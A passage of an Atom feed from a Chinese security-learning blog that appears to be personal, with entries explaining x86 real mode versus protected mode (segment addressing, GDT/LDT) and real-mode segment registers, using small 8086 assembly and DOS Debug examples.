<a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.7_common_gadget.html" target="_blank" rel="noopener">通用 gadget</a></p><p>[3] <a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/" target="_blank" rel="noopener">ROP学习：利用通用gadget</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x0
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】CPU 的两种工作模式：实模式和保护模式</title>
    <link href="https://muzibing.github.io/2020/06/14/2020.06.14%EF%BC%88127%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/14/2020.06.14（127）/</id>
    <published>2020-06-13T16:00:00.000Z</published>
    <updated>2020-06-14T12:00:26.348Z</updated>
    
    <content type="html"><![CDATA[<p><font size="2">首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。</font></p><h3 id="font-color-navy0x00-实模式real-modefont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-实模式real-modefont"></a> <font color="navy"><code>0x00 实模式（Real Mode）</code></font></h3><h4 id="font-color-brown1起源font"><a class="markdownIt-Anchor" href="#font-color-brown1起源font"></a> <font color="brown"><code>1.起源</code></font></h4><p><font size="2">实模式出现于早期 8086 CPU 时期，8086 也是第一款支持内存分段模型的处理器。当时，8086 只有一种工作模式，即实模式，但当时还没有这个说法。由于 CPU 的性能有限，一共只有 20 位地址线（地址空间只有 1M），以及 8 个 16 位的通用寄存器，以及 4 个 16 位的段寄存器。16 位的物理地址只能访问 64KB 的内存。所以，为了能够通过这些 16 位的寄存器去构成 20 位的主存地址，访问 1 MB 的内存，必须采取一种特殊的方式。</font></p><h4 id="font-color-brown2原理font"><a class="markdownIt-Anchor" href="#font-color-brown2原理font"></a> <font color="brown"><code>2.原理</code></font></h4><p><font size="2">第一个字段是由段寄存器提供的，是一个 16 位的段基址。第二字段是段内偏移量，它的值是由通用寄存器（如 EIP）来提供，所以也是 16 位。那么问题来了，两个 16 位的值如何组合成一个 20 位的地址呢？这里采用的方式是：把段寄存器所提供的段基址先向左移 4 位（或乘以 16），这样就变成了一个 20 位的值，然后再与 16 位的段偏移量相加。如下所示：</font></p><p><code>物理地址=段基址*16+段内偏移物理地址=段基址*16+段内偏移</code></p><p><font size="2">所以，假设段基址的值是<code>0xFF00</code>，段内偏移的值是<code>0x0110</code>。则物理地址可表示为:</font></p><p><code>0xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF1100xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF110</code></p><h4 id="font-color-brown3应用font"><a class="markdownIt-Anchor" href="#font-color-brown3应用font"></a> <font color="brown"><code>3.应用</code></font></h4><p><font size="2"><strong>在现代计算机上，实模式存在的时间非常短</strong>，所以一般我们是感觉不到它的存在。CPU 复位（reset）或加电（power on）的时候就是以实模式启动，在这个时候处理器以实模式工作，不能实现权限分级，也不能访问 20 位以上的地址线，也就只能访问 1M 内存。之后，加载操作系统模块，进入保护模式。</font></p><p><font size="2">此外，在这种模式下，系统在计算实际地址的时候是按照对 1M 求模的方式进行的，这种技术被称为 wrap-around。也就是说，当程序员给出超过 1M（100000H ~ 10FFEFH）的地址时，为了保持逻辑上正常，系统并不认为其访问越界而产生异常，而是自动从 0 开始计算。</font></p><p><font size="2">然而，在实模式中整个物理内存被看成分段的区域，程序代码和数据位于不同区域，<strong>系统程序和用户程序没有区别对待</strong>，而且每一个指针都是指向「实在」的物理地址。这样一来，用户程序的一个指针如果指向了系统程序区域或其他用户程序区域，并改变了值，容易造成软件甚至系统崩溃。</font></p><h3 id="font-color-navy0x01-保护模式protected-modefont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-保护模式protected-modefont"></a> <font color="navy"><code>0x01 保护模式（Protected Mode）</code></font></h3><h4 id="font-color-brown1起源font-2"><a class="markdownIt-Anchor" href="#font-color-brown1起源font-2"></a> <font color="brown"><code>1.起源</code></font></h4><p><font size="2">最开始的程序寻址是直接的<code>段基址 : 段内偏移</code>模式，这样的好处是所见即所得，程序员指定的地址就是物理地址，物理地址对程序员是可见的。但这就带来一些问题：</font></p><blockquote><ol><li>无法支持多任务</li><li>程序的安全性无法得到保证</li></ol></blockquote><p><font size="2">随着 CPU 的发展，CPU 的地址线的个数也从原来的 20 根变为现在的 32 根，所以可以访问的内存空间也从 1 MB 变为现在 4 GB，寄存器的位数也变为 32 位。因此，实模式下的内存地址计算方式就已经不再适用了，需要引入新的模式，即保护模式，实现更大空间的、更灵活的内存访问。</font></p><p><font size="2">在保护模式下，全部 32 条地址线有效，可寻址高达 4 GB 的物理地址空间。扩充的存储器<code>段式管理机制</code>和可选的<code>页式管理机制</code>，不仅为存储器共享和保护提供了硬件支持，而且为实现<code>虚拟存储器</code>提供了硬件支持，支持多任务，能够快速地进行任务切换和保护任务环境。四个特权级和完善的特权检查机制，既能实现资源共享又能保证代码和数据的安全及任务的隔离。</font></p><p><font size="2">总的来说，保护模式出现的原因名副其实</font>：<strong>保护进程地址空间</strong>。</p><h4 id="font-color-brown2原理font-2"><a class="markdownIt-Anchor" href="#font-color-brown2原理font-2"></a> <font color="brown"><code>2.原理</code></font></h4><p><font size="2">在保护模式下，地址的表示方式与实模式是一样的，都是<code>段基址 : 段内偏移</code>。不过，保护模式下<code>段</code>的概念发生了根本性的改变。实模式下的段值可以看作是地址的一部分，可直接参与转换计算。而保护模式下的段值（尽管仍然由原来的段寄存器表示）变成了一个索引（准确来说是 16 位的段选择子/段标识符 Selector，前 13 位为索引信息，后 3 位是硬件信息），指向了一个数据结构的一个表项（段表项），表项中详细定义了<code>段基址</code>、<code>界限</code>、<code>属性（权限）</code>等内容。这个数据结构是<code>全局描述符</code>（GDT，Global Descriptor Table），也有可能是<code>本地描述符</code>（LDT，Local Descriptor Table）。它们存放关于某个运行在内存中的程序的分段信息的，比如某个程序的代码段是从哪里开始，有多大；数据段又是从哪里开始，有多大。</font></p><p><font size="2">GDT 的作用是用来提供段式存储机制，这种机制是段寄存器和 GDT 中的描述符（段表项）共同支持的。每个描述符在 GDT 中占 8 字节，也就是 2 个双字（一个字等于两个字节，双字等于四个字节），或者说是 64 位。描述符的构成如下图所示：</font></p><p><img src="/images/127-1.png" alt></p><center><font size="1">GDT 描述符示意图（来源见参考）</font></center><p><font size="2">其中：</font></p><ul><li><font size="2">G 位是<code>粒度位</code>（Granularity），用于解释段界限的含义；</font></li><li><font size="2">D/B 位是<code>默认的操作数大小</code>（Default Operation Size），主要是为了能够在 32 位处理器上兼容运行 16 位保护模式的程序；</font></li><li><font size="2">L 位，是<code>64 位代码段标志</code>，保留此位给 64 位处理器使用；</font></li><li><font size="2">AVL 位，是<code>可以使用的位</code>（Available），通常由操作系统来用，处理器并不使用它；</font></li><li><font size="2">P 位是<code>段存在位</code>（Segment Present），表示对应的段是否存在；</font></li><li><font size="2">DPL 表示描述符的<code>特权级</code>（Descriptor Privilege Level），<code>0 ~ 3</code>，0 表示最高特权级别，<strong>这里再次点明了为何叫保护模式</strong>；</font></li><li><font size="2">S 位是<code>描述符的类型位</code>（Descriptor Type），0 为系统段，1 为代码段或数据段；</font></li><li><font size="2">TYPE 字段共 4 位，用于指示描述符的类型（X 执行、W 读写、R 读出、A 已访问）。</font></li></ul><p><font size="2">很明显，描述符中指定了 32 位的<code>段基址</code>，以及 20 位的<code>段界限</code>。在实模式下，段基址并非是真实的物理地址，在计算物理地址时，还要左移 4 位（乘以 16）。和实模式不同，在 32 位保护模式下，段基址是 32 位的，若加上段内偏移即为<code>线性地址</code>。如果未开启分页功能，该线性地址就是<code>物理地址</code>。</font></p><p><img src="/images/127-2.png" alt></p><center><font size="1">GDT 和 LDT 示意图（来源见参考）</font></center><p><font size="2">GDT 和 LDT 的区别在于：</font></p><blockquote><ol><li><font size="2">全局可见（global）和局部可见（local）；</font></li><li><font size="2">LDT 表存放在 LDT 类型的段之中，此时 GDT 必须含有 LDT 的段描述符；</font></li><li><font size="2">LDT 本身是一个段，而 GDT 不是。</font></li></ol></blockquote><p><strong>访问流程</strong>：</p><blockquote><ul><li><font size="2">查找 GDT 在线性地址中的段基址（表本身的位置），需要借助 GDTR 寄存器；</font></li><li><font size="2">通过该段基址和<code>逻辑地址</code>中的段标识符（selector），可以找到 LDT 段描述符；</font></li><li><font size="2">通过 GDT 中的这个 LDT 段描述符可以找到 LDT 相应的基地址；</font></li><li><font size="2">访问 LDT 需要使用 LDT 基地址和 LDT 段选择符（或叫段标识符），为了减少访问 LDT 时的段转换次数，LDT 段基址、LDT 段选择符、LDT 段限长都存放在 LDTR 寄存器中。</font></li></ul></blockquote><p><font size="2"><strong>注意</strong>：这里和 <a href="https://junhaow.com/2018/08/15/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于操作系统内存管理的总结</a> 中关于段式内存管理的描述有点出入。这里多了 LDT，因此从 GDT 中获得的是 LDT 段描述符，而不再是段基址。</font></p><p><font size="2">对于操作系统来说，每个系统必须定义一个 GDT，用于系统中的所有任务和程序。系统可选择性定义若干个 LDT。GDT 本身不是一个段，而是线性地址空间的一个数据结构；而 LDT 本身是一个段。</font></p><p><font size="2">想知道更多可以参考第三篇文章，整理得很好。</font></p><h3 id="font-color-navy0x02-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-referencefont"></a> <font color="navy"><code>0x02 Reference</code></font></h3><ul><li><a href="https://www.cnblogs.com/fatsheep9146/p/5116426.html" target="_blank" rel="noopener">MIT 6.828 JOS 学习笔记 6. Appendix 1: 实模式（real mode）与保护模式（protected mode）</a></li><li><a href="https://www.cnblogs.com/chenwb89/p/operating_system_002.html" target="_blank" rel="noopener">操作系统篇-浅谈实模式与保护模式</a></li><li><a href="https://www.cnblogs.com/chenwb89/p/operating_system_003.html" target="_blank" rel="noopener">操作系统篇-分段机制与 GDT | LDT</a></li><li><a href="http://www.voidcn.com/article/p-cdfddfhd-dr.html" target="_blank" rel="noopener">汇编学习（十七）X86汇编学习 (4) GDT</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font size=&quot;2&quot;&gt;首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-navy0x00-实模式real-modefont
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>实模式下的段寄存器</title>
    <link href="https://muzibing.github.io/2020/06/14/2020.06.14%EF%BC%88126%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/14/2020.06.14（126）/</id>
    <published>2020-06-13T16:00:00.000Z</published>
    <updated>2020-06-15T07:24:44.381Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-前言font"></a> <font color="brown"><code>0x00 前言</code></font></h3><p>      首先想要说明的是这里介绍的原理都是CPU实模式下的情况，有关CPU工作模式的请<a href="https://zhuanlan.zhihu.com/p/42309472" target="_blank" rel="noopener">点击这里</a>，下面简单的介绍一下段寄存器的来源和故事：</p><blockquote><p>     实模式出现于早期8088CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采取一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：<code>段基址：段偏移量</code>。<sup>[1]</sup></p><p>     但是随着CPU的发展，CPU的地址线的个数也从原来的20根变为现在的32根，<strong>所以可以访问的内存空间也从1MB变为现在4GB，寄存器的位数也变为32位。所以实模式下的内存地址计算方式就已经不再适合了</strong>。所以就引入了现在的保护模式，实现更大空间的，更灵活的内存访问。</p></blockquote><h3 id="font-color-brown0x01-csipfont"><a class="markdownIt-Anchor" href="#font-color-brown0x01-csipfont"></a> <font color="brown"><code>0x01 CS:IP</code></font></h3><p>      在解释段代码段寄存器CS之前，我们先了解一下16位下8086PC的CPU结构，如下图 ：</p><p><img src="/images/126-1.jpg" alt></p><blockquote><p>从图中可以看出，8086CPU是一个16位结构，它在处理、传输、暂存存储的地址为16位，但是它的地址总线为20位，所以要想办法用“地址加法器”使得两个16位的地址合成一个20位的物理地址。图中已经给出解决方法：用一个16位的段地址和一个16位的偏移地址，使得<code>段地址*16+偏移地址</code>就得到了20位的物理地址，相当于<strong>物理地址=基地址（段地址*16）+偏移地址</strong>，那这里为什么乘上16呢，这是因为这里地址的表示方式是16进制，乘上16相当于左移4位，也就从16位变为20位。</p><p><code>在这里留一个问题：怎么将一个20bit的字符串存储在16bit长的内存中呢？</code></p></blockquote><p>      <font color="green"><strong>在程序运行时，CPU怎么知道下一步要执行的语句呢？</strong></font>这里就需要<code>CS:IP</code>上场了，其中CS是代码段寄存器，<strong>存储的是当前指令的段地址</strong>，IP是指令指针寄存器，<strong>存储的是偏移地址</strong>，在8086PC中，CPU将<code>CS:IP</code>指向的内容当作指令执行，比如在8086PC（16位）中，CS的值为a，IP的值为b，那么 CPU下一条执行的指令就是处于地址<code>a*16+b</code>单元的数据，举例如下图：</p><p><img src="/images/126-2.png" alt></p><blockquote><p>图中的CS值为2000H，IP的值0000H，那么物理地址就为<code>2000H*16+0000H = 20000H</code>，所以要执行的指令为<code>mov ax,0123H</code>，下面我们用DOS的Debug进行调试</p></blockquote><p><img src="/images/126-3.png" alt></p><blockquote><p>首先我们将内存2000:0000-2000:0009处的内存改为如上图中的数据，然后我们再将CS和IP的值进行修改</p></blockquote><p><img src="/images/126-4.png" alt></p><blockquote><p>我们可以从上图中最后一行可以看出，CPU将要执行<code>2000:0000</code>处的指令，这样我们就很清楚代码寄存器CS和指令指针寄存器IP的作用了：<font color="red"><code>被用来指向CPU要执行的指令，也可以说将数据解释为代码</code></font></p></blockquote><h3 id="font-colorbrown-0x02-ds和addressfont"><a class="markdownIt-Anchor" href="#font-colorbrown-0x02-ds和addressfont"></a> <font color="brown"><code>0x02 DS和[address]</code></font></h3><p>      <font color="green"><strong>CPU在读写内存单元的时候，那么它是怎么找到该内存单元地址的？</strong></font>下面就来到了数据段寄存器DS，在8086PC中，<code>内存地址</code>由<code>段地址</code>和<code>偏移地址</code>组成，那么DS就是用来存放要访问数据的段地址的寄存器，比如要读取20001H单元的内容，汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H</span><br><span class="line">mov ds,ax# 不能直接mov ds,2000H，因为8086CPU不支持将数据直接送入段寄存器的操作</span><br><span class="line">mov al,[1]</span><br></pre></td></tr></table></figure><p>      上面的汇编代码就是将地址20001H处的数据读取到寄存器ax的低8位中，其中<code>[1]</code>表示的是内存单元的偏移地址，<strong><code>ds</code>中的数据为内存单元的段地址</strong>，那么物理地址就为：<code>ds*16+1</code>，这里要说明一点：在<code>mov al,[1]</code>指令中，<code>[]</code>中的<code>1</code>是偏移地址，而CPU会默认去寄存器<code>DS</code>中寻找它的段地址。下面我们还是用<code>0x00</code>中的例子来说明这一点：</p><p><img src="/images/126-3.png" alt></p><blockquote><p>地址<code>2000:0000</code>地址的字节为<code>23b8H</code>（<a href="https://zh.wikipedia.org/zh-hans/%E5%AD%97%E8%8A%82%E5%BA%8F" target="_blank" rel="noopener">小端存储</a>），我们将这个值赋给寄存器<code>ax</code>，则汇编指令为：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,[0]</span><br></pre></td></tr></table></figure><blockquote><p>我们在<code>Debug</code>中向地址<code>1000:0000</code>处输入我们的指令，然后再修改<code>CS</code>和<code>IP</code>的值分别为<code>1000</code>和<code>0000</code>，如下图：</p></blockquote><p><img src="/images/126-7.png" alt></p><blockquote><p>从上图中最后一行，我们可以看到下一条指令的指令为<code>mov ax,2000H</code>，那么下面我们执行完上面四条指令看一下结果：</p></blockquote><p><img src="/images/126-8.png" alt></p><blockquote><p>这里简单总结一下：<font color="green"><strong>对于存储在内存中的数据，CPU会根据CS:IP或者DS和[address]来解释为代码或者数值</strong></font></p></blockquote><h3 id="font-color-brown0x03-ssspfont"><a class="markdownIt-Anchor" href="#font-color-brown0x03-ssspfont"></a> <font color="brown"><code>0x03 SS:SP</code></font></h3><p>     <font color="green"><strong>CPU如何知道栈顶的位置？</strong></font>有关栈的问题不在这里叙述了，可以参考这两篇文章：<a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a>和<a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a>。我们知道CPU靠的是<code>CS:IP</code>知道了要指令指令所在的位置，靠DS和[address]知道了数据存储的位置，那么CPU也应该有相应的寄存器来存放栈顶的地址，那就是<code>SS:SP</code>，其中段寄存器<code>SS</code>存放的是栈顶的段地址，<code>SP</code>存放的是偏移地址，<strong>任意时刻，SS:SP指向栈顶元素</strong>，push指令和pop指令执行时，CPU会从SS和SP中得到栈顶的位置，但是这里要注意的这两个指令：</p><p><code>push</code></p><blockquote><ul><li><font color="navy">SP = SP - 2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶</font></li><li><font color="navy">将ax中的值放到SS:SP指向的内存单元，SS:SP此时指向新栈顶</font></li></ul><p>比如初始状态为SS=3000H，SP = 0002H，现在执行<code>push ax</code>，那么栈顶偏移<code>SP = SP - 2</code>，开辟了一个新的16位空间，然后再把ax的值放进去，此时<code>SP=0000H</code>，具体操作如下图</p></blockquote><p><img src="/images/126-9.png" alt></p><blockquote><p>初始值为：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000EH</code>（执行指针）</li><li><code>ss=3000H,sp=0002H</code>（栈顶）</li></ul><p>现在向地址<code>1000:000E</code>，处写入下方指令<code>push ax</code>，得到如下结果：</p></blockquote><p><img src="/images/126-10.png" alt></p><blockquote><p>从上图中得出信息：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000FH</code>（执行指针）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>ss=3000H,sp=0000H</code>（栈顶）<font size="2" color="navy"><strong>发生改变</strong></font></li></ul><p>和我们推到的一样</p></blockquote><p><code>pop</code></p><blockquote><ul><li><font color="navy">将SS:SP指向的内存单元处的数据送入ax中</font></li><li><font color="navy">SP = SP + 2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</font></li></ul><p>比如初始状态为SS=3000H，SP=0000H，现在执行<code>pop bx</code>，那么会将此时栈顶的数据（<code>1234H</code>）放入寄存器<code>bx</code>中，然后<code>SP = SP - 2</code>，具体操作如下：</p></blockquote><p><img src="/images/126-10.png" alt></p><blockquote><p>初始值为：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000FH</code>（执行指针）</li><li><code>ss=3000H,sp=0000H</code>（栈顶）</li></ul><p>现在向<code>1000:000F</code>中写入<code>pop bx</code>，如下：</p></blockquote><p><img src="/images/126-11.png" alt></p><blockquote><p>从上图中得出信息：</p><ul><li><code>ax=1234H,bx=1234H</code>（普通寄存器）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>cs=1000H,IP=0010H</code>（执行指针）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>ss=3000H,sp=0002H</code>（栈顶）<font size="2" color="navy"><strong>发生改变</strong></font></li></ul><p>栈顶又恢复到<code>3000:0002</code>，而且bx的值也发生了改变</p></blockquote><h3 id="font-color-navy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="http://blog.csdn.net/michael2012zhao/article/details/5554023" target="_blank" rel="noopener">“段寄存器”的故事</a></p><p>[2] 王爽，《汇编语言》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x00 前言
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="汇编语言" scheme="https://muzibing.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
</feed>
